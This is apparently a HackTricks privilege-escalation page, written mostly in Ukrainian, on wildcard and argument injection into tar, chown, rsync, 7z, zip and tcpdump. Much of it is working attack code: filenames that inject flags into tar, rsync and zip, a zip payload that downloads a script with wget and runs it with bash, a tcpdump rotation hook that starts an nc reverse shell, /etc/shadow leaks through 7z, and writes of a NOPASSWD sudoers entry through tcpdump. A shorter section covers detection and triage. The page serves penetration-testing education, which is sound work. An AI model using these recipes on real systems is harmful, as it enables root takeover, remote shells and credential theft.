# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** відбувається, коли привілейований скрипт запускає Unix-бінарний файл, такий як `tar`, `chown`, `rsync`, `zip`, `7z`, … із невзятою в лапки wildcard, наприклад `*`.
> Оскільки shell розгортає wildcard **до** виконання бінарного файлу, атакер, який може створювати файли в робочій директорії, може створювати імена файлів, що починаються з `-`, щоб вони інтерпретувалися як **параметри замість даних**, фактично приховано передаючи довільні flags або навіть команди.<sup>[[6]](#references)</sup>
> На цій сторінці зібрано найкорисніші primitives, останні дослідження та сучасні засоби виявлення за 2023-2025 роки.

## chown / chmod

Ви можете **скопіювати власника/групу або біти дозволів із reference-файлу**, зловживаючи flag `--reference`, коли ім’я файлу, схоже на параметр, розгортається через wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Коли root згодом виконає щось на кшталт:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Розгорнуте значення `--reference=.drf.php` перевизначає явно вказаних власника та режим, через що відповідні файли успадковують метадані від `.drf.php` (і, за наведеного вище налаштування, стають доступними для запису зловмиснику).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).<sup>[[7]](#references)</sup>
Див. також класичну статтю DefenseCode для отримання додаткових відомостей.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Виконуйте довільні команди, зловживаючи функцією **checkpoint** GNU tar та діями checkpoint.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Після того як root виконує, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` виконується від імені root.<sup>[[10]](#references)</sup>

### caveat щодо override компресора bsdtar / macOS

Стандартний `tar` у нових версіях macOS (на основі `libarchive`) *не* надає інтерфейс `--checkpoint` GNU tar, але bsdtar документує **--use-compress-program** для вибору зовнішнього компресора.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Коли привілейований скрипт запускає `tar -cf backup.tar *`, він знаходить `sh` через `PATH` жертви, і bsdtar запускає його як компресор.<sup>[[11]](#references)</sup> Це доводить можливість ін'єкції опцій, але саме по собі не є надійним примітивом для виконання довільних команд: ім'я файлу, створене через wildcard, не може містити `/`, а bsdtar передає дані архіву, а не вибрану зловмисником shell-команду. Для виконання коду додатково потрібен виконуваний файл, розташування якого можна контролювати через `PATH` або інший канал аргументів, що дає змогу вказати корисну програму.

---

## rsync

`rsync` дає змогу перевизначити віддалену shell або віддалений бінарний файл за допомогою прапорців командного рядка, таких як `-e` і `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Якщо root згодом заархівує директорію за допомогою `rsync -az * backup:/srv/`, ін’єктований прапорець може запустити shell через механізм remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (режим `rsync`).

---

## 7-Zip / 7z / 7za

Навіть якщо привілейований скрипт *захисно* додає `--` перед wildcard (щоб зупинити обробку опцій), CLI 7-Zip приймає **файли зі списками файлів**, якщо додати `@` перед іменем файлу. Поєднання цього із symlink дає змогу *exfiltrate довільні файли*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Якщо root виконає щось на кшталт:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши його вміст у stderr**.<sup>[[13]](#references)</sup>

Це працює навіть із `-- *`, оскільки CLI 7-Zip явно приймає як звичайні імена файлів, так і `@listfiles` як позиційні аргументи, тому буквальне ім’я файлу на кшталт `@root.txt` усе одно обробляється особливим чином.<sup>[[13]](#references)</sup>

---

## zip

Існують два дуже практичні примітиви, коли application передає контрольовані користувачем імена файлів до `zip` (через wildcard або шляхом переліку імен без `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE через test hook: `-T` вмикає “test archive”, а `-TT <cmd>` замінює tester довільною програмою (довга форма: `--unzip-command <cmd>`). Якщо ви можете інжектити імена файлів, що починаються з `-`, розділіть flags між окремими іменами файлів, щоб parsing коротких options працював.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Примітки
- НЕ намагайтеся використати одне ім’я файлу на кшталт `'-T -TT <cmd>'` — короткі опції обробляються посимвольно, і це не спрацює. Використовуйте окремі токени, як показано.<sup>[[3]](#references)</sup>
- Якщо застосунок видаляє скісні риски з імен файлів, отримайте файл із bare host/IP (шлях за замовчуванням — `/index.html`) і збережіть локально за допомогою `-O`, а потім виконайте.<sup>[[3]](#references)</sup>
- Ви можете налагодити parsing за допомогою `-sc` (показати оброблений argv) або `-h2` (більше довідки), щоб зрозуміти, як обробляються ваші токени.<sup>[[3]](#references)</sup>

Приклад (локальна поведінка у zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Ексфільтрація даних/leak: Якщо вебрівень повертає `zip` stdout/stderr (поширено у наївних wrapper), інʼєктовані flags на кшталт `--help` або помилки через неправильні options зʼявляться у HTTP-відповіді, підтверджуючи command-line injection і допомагаючи налаштовувати payload.<sup>[[3]](#references)</sup>

---

## Додаткові кандидати для option-injection

Коли privileged wrapper розгортає writable directory за допомогою wildcard, варто перевірити наведені нижче документовані option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Передати рядок команди shell |
| `git`   | `-c core.sshCommand=<cmd>` | Використовувати `<cmd>` замість SSH для Git fetch/push |
| `scp`   | `-S <program>` | Використовувати альтернативну SSH-compatible connection program |

Ці primitives корисні для перевірок на додаток до класичних *tar/rsync/zip*.

---

## Пошук вразливих wrapper і jobs

Останні case studies та рекомендації щодо detection показують, що wildcard/argv injection більше не є лише проблемою **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Цей самий клас помилок продовжує зʼявлятися у:

- web features, які «завантажують усе як zip/tar» із attacker-controlled upload directories
- debug shells постачальників або appliance, які надають **tcpdump** wrapper із attacker-controlled filename/filter fields
- backup або rotation jobs, які викликають `tar`, `rsync`, `7z`, `zip`, `chown` або `chmod` у writable directories

Корисні команди для triage (виклик `pspy` використовує документовані process/file-event та interval flags).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Швидкі евристики:

- `-- *` — хороше виправлення для багатьох GNU tools, але **не** для `7z`/`7za`, оскільки `@listfiles` обробляються окремо.<sup>[[13]](#references)</sup>
- Для `zip` шукайте wrappers, які безпосередньо перебирають filenames, контрольовані користувачем; розділення short options (`-T` + `-TT <cmd>`) усе ще працює навіть без shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Для `tcpdump` особливу увагу звертайте на wrappers, які дають змогу контролювати **output file names**, **rotation settings** або аргументи **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE через argv injection у wrappers

Коли restricted shell або vendor wrapper формує командний рядок `tcpdump` шляхом конкатенації полів, контрольованих користувачем (наприклад, параметра "file name"), без суворого quoting/validation, можна непомітно додати додаткові flags `tcpdump`. Комбінація `-G` (обертання за часом), `-W` (обмеження кількості files) і `-z <cmd>` (команда після rotation) забезпечує довільне виконання команд від імені користувача, який запускає tcpdump (часто root на appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Передумови:

- Ви можете впливати на `argv`, переданий до `tcpdump` (наприклад, через wrapper на кшталт `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper не санітизує пробіли або tokens, що починаються з `-`, у полі file name.<sup>[[4]](#references)</sup>

Класичний PoC (запускає reverse shell script із writable path).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` rotates every second, and `-W 1` stops after one rotated file; capture must отримати відповідний packet before rotation.<sup>[[18]](#references)</sup>
- `-z <cmd>` runs the post-rotate command once per rotation and passes the closed savefile path as an argument; ensure script/interpreter argument handling matches your payload.<sup>[[18]](#references)</sup>

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /path/script.sh`; have the script invoke `/bin/sh` itself if needed.<sup>[[18]](#references)</sup>
- If a vendor wrapper lets you choose the rotated path, audit that path control only in combination with a post-rotate command that interprets its savefile argument; path control alone does not execute file contents.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → довільний запис/читання та root

Example sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Правило залишає кілька доступних опцій у задокументованому парсері `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` і permissive patterns обмежують лише перший аргумент `-w`. `tcpdump` приймає кілька опцій `-w`; остання має пріоритет.<sup>[[3]](#references)[[18]](#references)</sup>
- Правило не фіксує інші опції, тому дозволені `-Z`, `-r`, `-V` тощо.<sup>[[3]](#references)[[18]](#references)</sup>

Відповідні примітиви задокументовано нижче.<sup>[[3]](#references)[[18]](#references)</sup>
- Перевизначити шлях призначення за допомогою другого `-w` (перший лише відповідає вимогам sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal у першому `-w`, щоб вийти за межі обмеженого дерева.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Примусово встановити власника вихідних файлів за допомогою `-Z root` (створює файли, власником яких є root, будь-де).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Запис довільного вмісту шляхом повторного відтворення створеного PCAP через `-r` (наприклад, щоб додати рядок до sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Створіть PCAP, що містить точне ASCII-значення, і запишіть його від імені root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Довільне читання файлів/витік секретів за допомогою `-V <file>` (інтерпретує список savefiles). Діагностичні повідомлення про помилки часто виводять рядки, розкриваючи вміст.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Повний Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Виявлено Potential Shell через Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Назад у майбутнє: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Виклик `chown` у GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Виклик `chmod` у GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Контрольні точки GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Посібник bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Посібник rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Синтаксис командного рядка 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Посібник flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Документація з конфігурації Git](https://git-scm.com/docs/git-config)
- [17] [Посібник `scp` для OpenBSD](https://man.openbsd.org/scp)
- [18] [Посібник tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
